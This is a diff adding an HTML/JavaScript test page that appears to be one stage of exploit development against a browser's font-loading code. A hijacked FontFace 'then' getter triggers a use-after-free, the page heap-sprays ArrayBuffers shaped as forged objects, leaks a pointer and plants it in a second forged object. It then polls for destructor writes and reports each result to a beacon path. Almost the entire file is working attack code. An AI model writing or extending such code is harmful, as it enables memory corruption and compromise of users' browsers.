@@ -1,0 +1,261 @@
+<!--
+  p656g: release hunt — make the stuck LoadRequest REJECT
+
+  Evidence chain (this console):
+    p656b: forge CONFIRMED in main doc (rc = seed+1 after addClient)
+    p656c: fonts.clear() does NOT release the +1
+    p656f: moving ffB to iframe + nav does NOT release the +1
+           -> the +1 is the LoadRequest client of the 'CD' load on the
+              CSS face "sb" (our forged buffer) in the MAIN FontFaceSet
+
+  v4: the LoadRequest releases when its load SETTLES (resolve/reject).
+  The stuck face can never resolve (wrapper corrupted mid-load), but it
+  CAN reject if its source FAILS. So: sb src = local(NoSuchFont) ->
+  error path -> removeClient -> deref -> rc 1->0 -> ~CSSFontFace on our
+  forged fields.
+
+  Stages (each observed independently):
+    S1: failing src alone (error path may release by itself)
+    S2: if rc still 1 -> fresh document.fonts.load('1em sb','C') attempt
+    S3: if rc still 1 -> document.fonts.clear() with failed-load state
+  Verdicts: D2-CHANGED (destructor wrote) / D2-FREED (allocator re-took)
+            with full 192B dumps on first change.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656g</title></head>
+<body>p656g: reject release hunt
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656G-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'reject-hunt');
+flush();
+
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var hit1 = -1, hit2 = -1;
+var dv1 = null, dv2 = null;
+var phase = 0;
+
+// sa: VALID font (phase-1 proven pattern untouched)
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+// sb: FAILING font — the reject path is the release trigger
+var sty2 = document.createElement('style');
+sty2.textContent = "@font-face { font-family: sb; src: local(NoSuchFontXYZ123); unicode-range: U+0043; }";
+document.head.appendChild(sty2);
+
+var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+document.fonts.add(ffB);
+void ffB.loaded;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      sty1.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);
+        dv.setUint32(0x04, 0xAAAA0001, true);
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=80');
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 0, true);
+        dv.setUint32(0x04, 0xCCCC0007, true);
+        dv.setUint32(0x58, T1_lo, true);
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=80 forge=T1 sb=NoSuchFont');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+setTimeout(function() {
+try {
+  hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+  }
+  if (hit1 < 0) {
+    for (var j = 0; j < bufs1.length; j++) {
+      if (bufs1[j].dv.getUint32(0x58, true) !== 0 || bufs1[j].dv.getUint32(0x5C, true) !== 0) { hit1 = j; break; }
+    }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'stop'); flush(); return; }
+
+  dv1 = bufs1[hit1].dv;
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+  emit('P1-HIT', 'hit=' + hit1 + ' T1=' + hex32(T1_hi) + hex32(T1_lo));
+  flush();
+  if (!T1_lo && !T1_hi) { emit('P1-FAIL', 'T1 null'); flush(); return; }
+
+  phase = 2;
+  document.fonts.load('1em fb, sb', 'CD');
+
+  setTimeout(function() {
+  try {
+    hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var j = 0; j < bufs2.length; j++) {
+        if (bufs2[j].dv.getUint32(0x68, true) !== 0 || bufs2[j].dv.getUint32(0x6C, true) !== 0) { hit2 = j; break; }
+      }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'stop'); flush(); return; }
+
+    dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0, true);
+    var held = (dv2.getUint32(0x58, true) === T1_lo && dv2.getUint32(0x5C, true) === T1_hi);
+    emit('P2-HIT', 'hit=' + hit2 + ' rc=' + rc2 + ' forge=' + held);
+    flush();
+    if (!held) { emit('FORGE-FAIL', 'stop'); flush(); return; }
+
+    // ============ RELEASE HUNT ============
+    var snap2 = [];
+    for (var j = 0; j < 192; j += 4) snap2.push(dv2.getUint32(j, true));
+
+    var fresh = [];
+    var finished = false;
+
+    function watch(label, ms, polls, next) {
+      var n = 0;
+      function w() {
+        n++;
+        for (var k = 0; k < 6; k++) {
+          var ab = new ArrayBuffer(192);
+          var dvf = new DataView(ab);
+          dvf.setUint32(0x04, 0xF7EE0661, true);
+          fresh.push(dvf);
+        }
+        var rc = dv2.getUint32(0, true);
+        var mk = dv2.getUint32(4, true);
+        var changed = [];
+        for (var j = 0; j < 192; j += 4) {
+          var cur = dv2.getUint32(j, true);
+          if (cur !== snap2[j / 4]) {
+            changed.push('+' + j.toString(16) + ':' + hex32(snap2[j/4]) + '>' + hex32(cur));
+            snap2[j / 4] = cur;
+          }
+        }
+        if (mk === 0xF7EE0661 && !finished) {
+          finished = true;
+          emit('D2-FREED', label + ' n=' + n + ' — slot re-taken by spray');
+          flush();
+          return;
+        }
+        if (changed.length && !finished) {
+          finished = true;
+          emit('D2-CHANGED', label + ' n=' + n + ' rc=' + rc + ' diffs=' + changed.length);
+          emit('D2-DIFFS', changed.slice(0, 12).join(' '));
+          var full = [];
+          for (var j2 = 0; j2 < 192; j2 += 8) {
+            full.push('+' + j2.toString(16) + '=' + hex32(dv2.getUint32(j2+4, true)) + hex32(dv2.getUint32(j2, true)));
+          }
+          emit('D2-FULL', full.join(' '));
+          flush();
+          return;
+        }
+        if (n === 1 || n % 5 === 0) {
+          emit(label, 'n=' + n + ' rc=' + rc);
+          flush();
+        }
+        if (n < polls) { setTimeout(w, ms); }
+        else if (next) { next(); }
+        else {
+          emit('VERDICT', finished ? 'released' : 'NEVER-RELEASED rc=' + dv2.getUint32(0, true));
+          emit('ALIVE', 'end');
+          flush();
+        }
+      }
+      setTimeout(w, ms);
+    }
+
+    emit('HUNT', 'S1 observe reject-path (sb=NoSuchFont)');
+    flush();
+
+    // S1: just observe — the failing src may release on its own
+    watch('S1', 120, 12, function() {
+      if (finished) { emit('VERDICT', 'S1 reject-path released'); emit('ALIVE', 'end'); flush(); return; }
+      // S2: fresh load attempt on the stuck family
+      emit('HUNT', 'S2 fresh fonts.load(1em sb, C)');
+      flush();
+      try {
+        document.fonts.load('1em sb', 'C').then(
+          function() { emit('S2-SETTLE', 'resolved (!)'); flush(); },
+          function(e) { emit('S2-SETTLE', 'rejected: ' + String(e).slice(0, 50)); flush(); }
+        );
+      } catch(e) { emit('S2-ERR', String(e).slice(0, 60)); flush(); }
+      watch('S2', 120, 12, function() {
+        if (finished) { emit('VERDICT', 'S2 fresh-load released'); emit('ALIVE', 'end'); flush(); return; }
+        // S3: clear with failed-load state
+        emit('HUNT', 'S3 fonts.clear()');
+        flush();
+        try { document.fonts.clear(); emit('S3-CLEAR', 'ok'); } catch(e) { emit('S3-CLEAR', 'ERR'); }
+        flush();
+        watch('S3', 120, 15, function() {
+          emit('VERDICT', finished ? 'S3 released' : 'NEVER-RELEASED rc=' + dv2.getUint32(0, true));
+          emit('ALIVE', 'end');
+          flush();
+        });
+      });
+    });
+
+  } catch(e2) { emit('P2-FATAL', String(e2).slice(0,150)); flush(); }
+  }, 150);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,150)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
